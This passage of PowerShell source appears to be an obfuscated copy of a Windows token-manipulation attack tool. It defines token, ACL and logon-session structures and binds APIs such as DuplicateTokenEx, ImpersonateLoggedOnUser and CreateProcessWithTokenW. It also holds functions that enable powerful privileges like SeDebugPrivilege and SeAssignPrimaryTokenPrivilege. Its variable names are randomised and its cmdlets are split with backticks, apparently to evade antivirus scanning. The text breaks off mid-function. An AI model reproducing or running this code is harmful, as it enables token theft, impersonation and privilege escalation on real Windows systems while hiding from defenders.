    $PublicArt.DefineLiteral('MaxTokenInfoClass', [UInt32] 41) | Out-Null
	$BloodFrail = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('LARGE_INTEGER', $OneWooden, [System.ValueType], 8)
	$PublicArt.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$PublicArt.DefineField('HighPart', [UInt32], 'Public') | Out-Null
	$SkinRoom = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('LUID', $OneWooden, [System.ValueType], 8)
	$PublicArt.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$PublicArt.DefineField('HighPart', [Int32], 'Public') | Out-Null
	$DesignTaste = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('TOKEN_STATISTICS', $OneWooden, [System.ValueType])
	$PublicArt.DefineField('TokenId', $DesignTaste, 'Public') | Out-Null
	$PublicArt.DefineField('AuthenticationId', $DesignTaste, 'Public') | Out-Null
    $PublicArt.DefineField('ExpirationTime', $SkinRoom, 'Public') | Out-Null
    $PublicArt.DefineField('TokenType', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('ImpersonationLevel', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('DynamicCharged', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('DynamicAvailable', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('GroupCount', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('ModifiedId', $DesignTaste, 'Public') | Out-Null
	$SpoonElbow = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('LSA_UNICODE_STRING', $OneWooden, [System.ValueType])
	$PublicArt.DefineField('Length', [UInt16], 'Public') | Out-Null
	$PublicArt.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
    $PublicArt.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
	$WinkSister = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('LSA_LAST_INTER_LOGON_INFO', $OneWooden, [System.ValueType])
	$PublicArt.DefineField('LastSuccessfulLogon', $SkinRoom, 'Public') | Out-Null
	$PublicArt.DefineField('LastFailedLogon', $SkinRoom, 'Public') | Out-Null
    $PublicArt.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
	$LastPie = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('SECURITY_LOGON_SESSION_DATA', $OneWooden, [System.ValueType])
	$PublicArt.DefineField('Size', [UInt32], 'Public') | Out-Null
	$PublicArt.DefineField('LoginID', $DesignTaste, 'Public') | Out-Null
    $PublicArt.DefineField('Username', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('LoginDomain', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('AuthenticationPackage', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('LogonType', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('Session', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('Sid', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('LoginTime', $SkinRoom, 'Public') | Out-Null
    $PublicArt.DefineField('LoginServer', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('DnsDomainName', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('Upn', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('UserFlags', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('LastLogonInfo', $LastPie, 'Public') | Out-Null
    $PublicArt.DefineField('LogonScript', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('ProfilePath', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('HomeDirectory', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('HomeDirectoryDrive', $WinkSister, 'Public') | Out-Null
    $PublicArt.DefineField('LogoffTime', $SkinRoom, 'Public') | Out-Null
    $PublicArt.DefineField('KickOffTime', $SkinRoom, 'Public') | Out-Null
    $PublicArt.DefineField('PasswordLastSet', $SkinRoom, 'Public') | Out-Null
    $PublicArt.DefineField('PasswordCanChange', $SkinRoom, 'Public') | Out-Null
    $PublicArt.DefineField('PasswordMustChange', $SkinRoom, 'Public') | Out-Null
	$LunchWink = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('STARTUPINFO', $OneWooden, [System.ValueType])
	$PublicArt.DefineField('cb', [UInt32], 'Public') | Out-Null
	$PublicArt.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $PublicArt.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $PublicArt.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$SomberSwing = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('PROCESS_INFORMATION', $OneWooden, [System.ValueType])
	$PublicArt.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$PublicArt.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$PublicArt = $YarnWool.DefineType('TOKEN_ELEVATION', $OneWooden, [System.ValueType])
	$PublicArt.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
	$SweetAnger = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $PublicArt = $YarnWool.DefineType('LUID_AND_ATTRIBUTES', $OneWooden, [System.ValueType], 12)
    $PublicArt.DefineField('Luid', $DesignTaste, 'Public') | Out-Null
    $PublicArt.DefineField('Attributes', [UInt32], 'Public') | Out-Null
    $HugeBlood = $PublicArt.CreateType()
		
    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $PublicArt = $YarnWool.DefineType('TOKEN_PRIVILEGES', $OneWooden, [System.ValueType], 16)
    $PublicArt.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('Privileges', $HugeBlood, 'Public') | Out-Null
    $CrowdMute = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $PublicArt = $YarnWool.DefineType('ACE_HEADER', $OneWooden, [System.ValueType])
    $PublicArt.DefineField('AceType', [Byte], 'Public') | Out-Null
    $PublicArt.DefineField('AceFlags', [Byte], 'Public') | Out-Null
    $PublicArt.DefineField('AceSize', [UInt16], 'Public') | Out-Null
    $ChunkyDisarm = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $PublicArt = $YarnWool.DefineType('ACL', $OneWooden, [System.ValueType])
    $PublicArt.DefineField('AclRevision', [Byte], 'Public') | Out-Null
    $PublicArt.DefineField('Sbz1', [Byte], 'Public') | Out-Null
    $PublicArt.DefineField('AclSize', [UInt16], 'Public') | Out-Null
    $PublicArt.DefineField('AceCount', [UInt16], 'Public') | Out-Null
    $PublicArt.DefineField('Sbz2', [UInt16], 'Public') | Out-Null
    $HammerTemper = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $PublicArt = $YarnWool.DefineType('ACCESS_ALLOWED_ACE', $OneWooden, [System.ValueType])
    $PublicArt.DefineField('Header', $ChunkyDisarm, 'Public') | Out-Null
    $PublicArt.DefineField('Mask', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('SidStart', [UInt32], 'Public') | Out-Null
    $AblazeMug = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $PublicArt = $YarnWool.DefineType('TRUSTEE', $OneWooden, [System.ValueType])
    $PublicArt.DefineField('pMultipleTrustee', [IntPtr], 'Public') | Out-Null
    $PublicArt.DefineField('MultipleTrusteeOperation', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('TrusteeForm', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('TrusteeType', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('ptstrName', [IntPtr], 'Public') | Out-Null
    $TwigFail = $PublicArt.CreateType()

    # Microsoft".
    $OneWooden = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $PublicArt = $YarnWool.DefineType('EXPLICIT_ACCESS', $OneWooden, [System.ValueType])
    $PublicArt.DefineField('grfAccessPermissions', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('grfAccessMode', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('grfInheritance', [UInt32], 'Public') | Out-Null
    $PublicArt.DefineField('Trustee', $TwigFail, 'Public') | Out-Null
    $CurlTwo = $PublicArt.CreateType()
    # Microsoft".


    # Microsoft".
    # Microsoft".
    # Microsoft".
    $DragSign = Get-ProcAddress kernel32.dll OpenProcess
	$ShirtGate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$GustyStay = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DragSign, $ShirtGate)

    $NearStamp = Get-ProcAddress advapi32.dll OpenProcessToken
	$MilkChange = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$HairNew = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NearStamp, $MilkChange)    

    $EmployRoot = Get-ProcAddress advapi32.dll GetTokenInformation
	$BoltUseful = Get-DelegateType @([IntPtr], $BloodFrail, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
	$LipWaste = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EmployRoot, $BoltUseful)    

    $PleasePray = Get-ProcAddress advapi32.dll SetThreadToken
	$GlibCrow = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
	$HuskyOwe = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PleasePray, $GlibCrow)    

    $DearSneaky = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
	$PlaceSimple = Get-DelegateType @([IntPtr]) ([Bool])
	$AjarFill = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DearSneaky, $PlaceSimple)

    $ScarceEnter = Get-ProcAddress advapi32.dll RevertToSelf
	$ActorHurt = Get-DelegateType @() ([Bool])
	$TidyExpand = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ScarceEnter, $ActorHurt)

    $BitHarsh = Get-ProcAddress secur32.dll LsaGetLogonSessionData
	$HoleDeer = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
	$UnitCave = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BitHarsh, $HoleDeer)

    $SkyLovely = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$DeepAnnoy = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$NationSpicy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SkyLovely, $DeepAnnoy)

    $RecordDear = Get-ProcAddress msvcrt.dll memset
	$FuzzyCast = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$LoveBucket = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RecordDear, $FuzzyCast)

    $DressSink = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$RemainWacky = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$AwfulBottle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DressSink, $RemainWacky)

    $SpotNeedy = Get-ProcAddress advapi32.dll LookupAccountSidW
	$NeckThrone = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
	$AdmireBang = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SpotNeedy, $NeckThrone)

    $BriefEffect = Get-ProcAddress kernel32.dll CloseHandle
	$OfferGrin = Get-DelegateType @([IntPtr]) ([Bool])
	$LiveBlush = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BriefEffect, $OfferGrin)

    $TwistRustic = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$SnakesPencil = Get-DelegateType @([IntPtr]) ([UInt32])
	$QuiltSturdy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TwistRustic, $SnakesPencil)

    $StaySeal = Get-ProcAddress kernel32.dll OpenThread
	$OddIcy = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$SulkyNasty = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StaySeal, $OddIcy)

    $HorseMany = Get-ProcAddress advapi32.dll OpenThreadToken
	$SawEmploy = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$BanSpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HorseMany, $SawEmploy)

    $DeerTeeny = Get-ProcAddress advapi32.dll CreateProcessAsUserW
	$LameNasty = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$RifleSwanky = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeerTeeny, $LameNasty)

    $CellarPour = Get-ProcAddress user32.dll OpenWindowStationW
    $LiveTub = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    $LethalDamp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CellarPour, $LiveTub)

    $AvoidGusty = Get-ProcAddress user32.dll OpenDesktopA
    $StingyThin = Get-DelegateType @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    $OvalSon = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AvoidGusty, $StingyThin)

    $GroupFound = Get-ProcAddress Advapi32.dll ImpersonateSelf
    $GiddyStory = Get-DelegateType @([Int32]) ([Bool])
    $TankBrake = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GroupFound, $GiddyStory)

    $MemoryWood = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
    $SpellInform = Get-DelegateType @([String], [String], $DesignTaste.MakeByRefType()) ([Bool])
    $SaltyJuggle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MemoryWood, $SpellInform)

    $BattlePeel = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
    $NationVoice = Get-DelegateType @([IntPtr], [Bool], $CrowdMute.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $GratisWorry = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BattlePeel, $NationVoice)

    $ArrestTug = Get-ProcAddress kernel32.dll GetCurrentThread
    $ColorStove = Get-DelegateType @() ([IntPtr])
    $HuskyHumor = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ArrestTug, $ColorStove)

    $NormalTwo = Get-ProcAddress advapi32.dll GetSecurityInfo
    $SignMiddle = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    $DetectPotato = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NormalTwo, $SignMiddle)

    $LowlyZip = Get-ProcAddress advapi32.dll SetSecurityInfo
    $CountBuzz = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $ArmQuilt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LowlyZip, $CountBuzz)

    $PeckArmy = Get-ProcAddress advapi32.dll GetAce
    $WigglyGlove = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    $DrearyEar = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeckArmy, $WigglyGlove)

    $SpotNeedy = Get-ProcAddress advapi32.dll LookupAccountSidW
    $NeckThrone = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $AdmireBang = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SpotNeedy, $NeckThrone)

    $CrookWait = Get-ProcAddress advapi32.dll AddAccessAllowedAce
    $PlanesMan = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    $MixRifle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CrookWait, $PlanesMan)

    $CrushEarth = Get-ProcAddress advapi32.dll CreateWellKnownSid
    $HookJazzy = Get-DelegateType @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $CameraMarch = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CrushEarth, $HookJazzy)

    $NarrowSad = Get-ProcAddress advapi32.dll SetEntriesInAclW
    $PlantsQuaint = Get-DelegateType @([UInt32], $CurlTwo.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    $ColorBoring = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NarrowSad, $PlantsQuaint)

    $HatProud = Get-ProcAddress kernel32.dll LocalFree
    $SteelNote = Get-DelegateType @([IntPtr]) ([IntPtr])
    $ManMass = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HatProud, $SteelNote)

    $NameTrail = Get-ProcAddress advapi32.dll LookupPrivilegeNameW
    $BasinPine = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $SwankyPhobic = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NameTrail, $BasinPine)
    # Microsoft".


    # Microsoft".
    Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$EggsTrust,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$StirPretty
		)
		
		[Byte[]]$RiskCrack = [BitConverter]::GetBytes($EggsTrust)
		[Byte[]]$ScrewBook = [BitConverter]::GetBytes($StirPretty)
		[Byte[]]$SipLamp = [BitConverter]::GetBytes([UInt64]0)

		if ($RiskCrack.Count -eq $ScrewBook.Count)
		{
			$SoundFluffy = 0
			for ($AwakeOrder = 0; $AwakeOrder -lt $RiskCrack.Count; $AwakeOrder++)
			{
				# Microsoft".
				[UInt16]$StepVoyage = $RiskCrack[$AwakeOrder] + $ScrewBook[$AwakeOrder] + $SoundFluffy

				$SipLamp[$AwakeOrder] = $StepVoyage -band 0x00FF
				
				if (($StepVoyage -band 0xFF00) -eq 0x100)
				{
					$SoundFluffy = 1
				}
				else
				{
					$SoundFluffy = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($SipLamp, 0)
	}


    # Microsoft".
    function Enable-SeAssignPrimaryTokenPrivilege
    {	
	    [IntPtr]$TawdryCellar = $HuskyHumor.Invoke()
	    if ($TawdryCellar -eq [IntPtr]::Zero)
	    {
		    Throw "Unable to get the handle to the current thread"
	    }
		
	    [IntPtr]$RedKnife = [IntPtr]::Zero
	    [Bool]$RoughCobweb = $BanSpy.Invoke($TawdryCellar, $PriceyDeer.TOKEN_QUERY -bor $PriceyDeer.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$RedKnife)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($RoughCobweb -eq $false)
	    {
		    if ($ErrorCode -eq $PriceyDeer.ERROR_NO_TOKEN)
		    {
			    $RoughCobweb = $TankBrake.Invoke($PriceyDeer.SECURITY_DELEGATION)
			    if ($RoughCobweb -eq $false)
			    {
				    Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
			    }
				
			    $RoughCobweb = $BanSpy.Invoke($TawdryCellar, $PriceyDeer.TOKEN_QUERY -bor $PriceyDeer.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$RedKnife)
			    if ($RoughCobweb -eq $false)
			    {
				    Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $LiveBlush.Invoke($TawdryCellar) | Out-Null
	
        $TailString = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DesignTaste)
        $LazySign = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TailString)
        $ReignRural = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LazySign, [Type]$DesignTaste)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LazySign)

	    $RoughCobweb = $SaltyJuggle.Invoke($null, "SeAssignPrimaryTokenPrivilege", [Ref] $ReignRural)

	    if ($RoughCobweb -eq $false)
	    {
		    Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
	    }

        [UInt32]$EagerVeil = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$HugeBlood)
        $ScorchGrab = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($EagerVeil)
        $BatheDebt = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ScorchGrab, [Type]$HugeBlood)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ScorchGrab)

        $BatheDebt.Luid = $ReignRural
        $BatheDebt.Attributes = $PriceyDeer.SE_PRIVILEGE_ENABLED

        [UInt32]$SweetRetire = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$CrowdMute)
        $GratePaste = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SweetRetire)
        $ExpandChange = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GratePaste, [Type]$CrowdMute)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($GratePaste)
	    $ExpandChange.PrivilegeCount = 1
	    $ExpandChange.Privileges = $BatheDebt

        $FangRetire:TokenPriv = $ExpandChange

	    $RoughCobweb = $GratisWorry.Invoke($RedKnife, $false, [Ref] $ExpandChange, $SweetRetire, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($RoughCobweb -eq $false)
	    {
            Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
	    }

        $LiveBlush.Invoke($RedKnife) | Out-Null
    }


    # Microsoft".
    function Enable-SupplyBeam
    {
        Param(
            [Parameter()]
            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
            [String]
            $SupplyBeam
        )

	    [IntPtr]$TawdryCellar = $HuskyHumor.Invoke()
	    if ($TawdryCellar -eq [IntPtr]::Zero)
	    {
		    Throw "Unable to get the handle to the current thread"
	    }
		
	    [IntPtr]$RedKnife = [IntPtr]::Zero
	    [Bool]$RoughCobweb = $BanSpy.Invoke($TawdryCellar, $PriceyDeer.TOKEN_QUERY -bor $PriceyDeer.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$RedKnife)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($RoughCobweb -eq $false)
	    {
		    if ($ErrorCode -eq $PriceyDeer.ERROR_NO_TOKEN)
		    {
			    $RoughCobweb = $TankBrake.Invoke($PriceyDeer.SECURITY_DELEGATION)
			    if ($RoughCobweb -eq $false)
			    {
				    Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
			    }
				
			    $RoughCobweb = $BanSpy.Invoke($TawdryCellar, $PriceyDeer.TOKEN_QUERY -bor $PriceyDeer.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$RedKnife)
			    if ($RoughCobweb -eq $false)
			    {
				    Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $LiveBlush.Invoke($TawdryCellar) | Out-Null
	
        $TailString = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DesignTaste)
        $LazySign = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TailString)
        $ReignRural = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LazySign, [Type]$DesignTaste)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LazySign)

	    $RoughCobweb = $SaltyJuggle.Invoke($null, $SupplyBeam, [Ref] $ReignRural)

	    if ($RoughCobweb -eq $false)
	    {
		    Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
	    }

        [UInt32]$EagerVeil = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$HugeBlood)
        $ScorchGrab = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($EagerVeil)
        $BatheDebt = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ScorchGrab, [Type]$HugeBlood)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ScorchGrab)

        $BatheDebt.Luid = $ReignRural
        $BatheDebt.Attributes = $PriceyDeer.SE_PRIVILEGE_ENABLED

        [UInt32]$SweetRetire = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$CrowdMute)
        $GratePaste = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SweetRetire)
        $ExpandChange = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GratePaste, [Type]$CrowdMute)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($GratePaste)
	    $ExpandChange.PrivilegeCount = 1
	    $ExpandChange.Privileges = $BatheDebt

        $FangRetire:TokenPriv = $ExpandChange

        Write-Verbose "Attempting to enable privilege: $SupplyBeam"
	    $RoughCobweb = $GratisWorry.Invoke($RedKnife, $false, [Ref] $ExpandChange, $SweetRetire, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($RoughCobweb -eq $false)
	    {
            Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
	    }

